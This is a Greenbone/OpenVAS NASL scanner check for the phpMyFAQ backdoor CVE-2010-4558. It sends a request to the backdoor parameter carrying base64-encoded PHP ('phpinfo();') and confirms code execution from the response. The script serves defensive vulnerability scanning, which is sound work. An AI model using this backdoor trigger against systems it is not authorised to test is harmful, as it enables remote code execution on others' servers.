# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:phpmyfaq:phpmyfaq";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100948");
  script_version("2025-09-19T15:40:40+0000");
  script_tag(name:"last_modification", value:"2025-09-19 15:40:40 +0000 (Fri, 19 Sep 2025)");
  script_tag(name:"creation_date", value:"2010-12-20 20:02:52 +0100 (Mon, 20 Dec 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2010-4558");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_name("phpMyFAQ Backdoor Unauthorized Access Vulnerability");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_phpmyfaq_http_detect.nasl");
  script_mandatory_keys("phpmyfaq/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"phpMyFAQ is prone to an unauthorized-access vulnerability due
  to a backdoor in certain versions of the application.");

  script_tag(name:"impact", value:"Successful exploits allow remote attackers to execute arbitrary
  PHP code in the context of the affected application.");

  script_tag(name:"affected", value:"phpMyFAQ 2.6.11 and 2.6.12 obtained between December 4, 1010
  and December 15, 2010 are vulnerable.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  information.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45442");
  script_xref(name:"URL", value:"http://www.phpmyfaq.de/advisory_2010-12-15.php");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir +  "/index.php?phpmyfaq_new=cGhwaW5mbygpOwo=";

if (http_vuln_check(port: port, url: url, pattern: "<title>phpinfo", extra_check: make_list("PHP Core"))) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
